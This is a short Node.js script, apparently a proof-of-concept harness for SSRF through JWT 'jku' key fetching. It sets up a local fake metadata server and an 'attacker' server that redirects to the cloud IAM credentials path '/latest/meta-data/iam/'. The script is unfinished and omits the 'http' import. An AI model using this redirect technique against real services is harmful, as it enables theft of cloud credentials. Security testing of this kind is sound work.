import { generateKeyPairSync } from 'crypto';

const { privateKey } = generateKeyPairSync('rsa', {modulusLength:2048});
// internal "metadata" target
const internal = http.createServer((req,res)=>{ res.end('INTERNAL-METADATA: '+req.url); });
// attacker https server that 302 -> internal http host
const tls = { key: privateKey.export({type:'pkcs8',format:'pem'}), cert: '' };
// need a self-signed cert; use tls selfsign via generateKeyPair? simpler: skip cert by using http attacker but jku is https... 
// Instead test the protocol-policy question directly with http attacker -> https not needed; the real question is fetch following http internal after https start.
// We'll just confirm fetch follows a redirect whose Location is http://127.0.0.1 regardless of origin scheme by using http origin (Node allows).
await new Promise(r=>internal.listen(4702,r));
const attacker = http.createServer((req,res)=>{ res.writeHead(302,{Location:'http://127.0.0.1:4702/latest/meta-data/iam/'}); res.end(); });
await new Promise(r=>attacker.listen(4703,r));

// Simulate the vulnerable fetchKey path with the subdomain-bypass URL + redirect:follow
